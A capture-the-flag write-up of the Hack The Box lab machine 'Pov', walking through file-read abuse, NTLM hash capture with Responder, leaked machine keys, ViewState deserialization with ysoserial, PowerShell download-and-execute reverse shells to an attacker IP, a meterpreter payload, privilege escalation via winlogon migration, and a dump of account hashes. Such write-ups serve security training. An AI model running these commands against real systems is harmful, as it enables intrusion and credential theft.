---
title: HTB Pov Writeup
author: Elus1nist
layout: post
date: 12 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/a36f80aa6bc43863512ec9537c4366c9.png
---
Welcome! This is my writeup of the new Season 4 Medium machine from HTB, Pov. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -F -Pn -oN initial_scan 10.10.11.251
```
This gives us the scan results of:

```
Nmap scan report for pov.htb (10.10.11.251)
Host is up (0.071s latency).
Not shown: 99 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
```

We can see a singular open HTTP port. Not much to go o but good enough, added the virtual host `pov.htb` to the `/etc/hosts` file

---
---
## VHost Fuzzing

Knowing HackTheBox one of the first things I try with Web Servers is some Virtual Host Fuzzing

```sh
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://pov.htb/ -H Host: FUZZ.pov.htb -fs 12330
```

This shows us a possible virtual host of `dev.pov.htb`, added this to the `/etc/hosts` file

---
---
## Directory Fuzzing

I also fuzzed directories for the main website and also the Virtual host. This gives us the URL of `http://dev.pov.htb/portfolio`

```sh
feroxbuster --url http://dev.pov.htb/ --wordlist /opt/Seclist/Discovery/Web-Content/directory-list-2.3-medium.txt
```

---
---
## LFI in file download

When we visit this webpage we see a button to `Download CV`. Once intercepted with burp we can see the following request:

```sh
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 395
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=tOistpMlhQCea%2BBFaIWqyhJUON%2FKqhG%2BqYoaYHBAMZ1Q95Ui%2B6irjjc%2BwFG4Fpi3%2FC7OKsdhjN71SHBHBeJNPzRodzE%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=cv.pdf
```

We can try capturing a hash with responder as follows:

### Step 1: Start responder
```sh
sudo responder -I tun0
```
### Step 2: Leverage file fetch to fetch remote file
```sh
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 395
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=tOistpMlhQCea%2BBFaIWqyhJUON%2FKqhG%2BqYoaYHBAMZ1Q95Ui%2B6irjjc%2BwFG4Fpi3%2FC7OKsdhjN71SHBHBeJNPzRodzE%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=%5c%5c10.10.16.45%5cdefault.aspx
```

Responder then catches the following hash for the user `sfitz`

```sh
[SMB] NTLMv2-SSP Client   : 10.10.11.251
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:ade01d603f3eea80:112D21B1E46F272F5C5C9C8D7BE08182:010100000000000000D2BA699353DA01F04B1E04AFB560170000000002000800560054004800350001001E00570049004E002D004A0033004C00340034004B0033004A00480056004D0004003400570049004E002D004A0033004C00340034004B0033004A00480056004D002E0056005400480035002E004C004F00430041004C000300140056005400480035002E004C004F00430041004C000500140056005400480035002E004C004F00430041004C000700080000D2BA699353DA010600040002000000080030003000000000000000000000000020000076327C968C4667456C47512BA2F354865E85544312B1E482BD0B0897006C44240A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00340035000000000000000000
```

Unfortunately this hash cannot be cracked with hashcat and `rockyou.txt`

---
---
## Leverage LFI to leak webconfig

```sh
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 395
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=tOistpMlhQCea%2BBFaIWqyhJUON%2FKqhG%2BqYoaYHBAMZ1Q95Ui%2B6irjjc%2BwFG4Fpi3%2FC7OKsdhjN71SHBHBeJNPzRodzE%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=/web.config
```
This leaks the following web config file:
```sh
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

Now that we know the decryption type and the key, we can utilize the `ysoserial`exploit which uses a vulnerability in the `__VIEWSTATE` deserialization

---
---
## VIEWSTATE deserialization to get user

#### Step 1: Generate deserialization payload

```sh
./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.16.45:9001/Invoke-PowerShellTcp.ps1')" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

#### Step 2: Download and configure Invoke-PowerShellTcp.ps1 + Python web server on attacker machine

```sh
wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress <Attacker-IP> -Port 9443

sudo python3 -m http.server 9001
```

#### Step 3: Send payload over as exploit

```sh
__EVENTTARGET=download&
__EVENTARGUMENT=&
__VIEWSTATE=<DESERIALIZED_PAYLOAD>&
__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=JJiCVexImCV%2BTgxJq58ftt1K6k7sjKA5828zuIaD%2FliQ%2FSKfzvtgdiTCU%2Ffo3HOmHJm4OUgCrKAitKO5zyT%2B8WMjJnUnO1mRB6iDHzrMS1eF5eZN5dJFEW9GM0iK70bfal3oBw%3D%3D&file=/web.config
```

---
---
## Pivoting from sfitz -> alaading

In the Documents folder for the sfitz user we see the following PSCredentials file

```sh
PS C:\Users\sfitz\Documents> $credential = Import-Clixml -Path "c:\users\sfitz\documents\connection.xml"
PS C:\Users\sfitz\Documents> echo ($credential.UserName + ":" + $credential.GetNetworkCredential().Password)
```

This gives us the creds from the user `alaading`:`xxxx8fynP44xxxx`

We can now use the `RunasCs.exe` to execute commands as the `alaading` user as follows and gain a shell:
```sh
.\RunasCs.exe alaading xxxx8fynP44xxxx "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.16.45:9001/Invoke-PowerShellTcp.ps1')"
```

#### THIS GIVES THE USER FLAG AT: C:\Users\alaading\Desktop\user.txt

---
---
## Gaining root

When inspecting the privs of the the user alaading we see the `SeDebugPrivilege` as Enabled

thus we can gain root as follows:

#### Step 1:
meterpreter payload
```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[Port] -f exe -o payload.exe
```

#### Step 2:
then run msfconsole and setup a listener
```
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST [IP]
msf exploit(handler) > set LPORT [Port]
msf exploit(handler) > exploit
```

#### Step 3:
you are gonna then upload that payload to your victim machine

Attacker Machine:
```sh
python -m http.server 80
```
Victim Machine:
```powershell
(New-Object Net.WebClient).DownloadFile('<TargetFileURL>','<OutputFileName>')
```

#### Step 4:
and then run it start .\payload.exe on victim machine, you will get a connection on your msfconsole

#### Step 5:
then you will check for windLogon pid
```powershell
msf> shell
C:\Users\Public> powershell Get-Process winlogon     # Assume PID of 556
```

#### Step 6:
then on your msfconsole you are gonna migrate to that pid
```sh
migrate 556
```

#### Step 7:
and from there you run `shell` and get root from `C:\Users\Administrator\Desktop\root.txt`

---
---
## Hashes from box

```sh
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7c883121d0f63ee5b4312ba7572689b:::
alaading:1001:aad3b435b51404eeaad3b435b51404ee:31c0583909b8349cbe92961f9dfa5dbf:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sfitz:1000:aad3b435b51404eeaad3b435b51404ee:012e5ed95e8745ea5180f81648b6ec94:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1fa5b00b7c6cc4ac2807c4d5b3dd3dab:::
```

<img src="https://giffiles.alphacoders.com/206/206739.gif">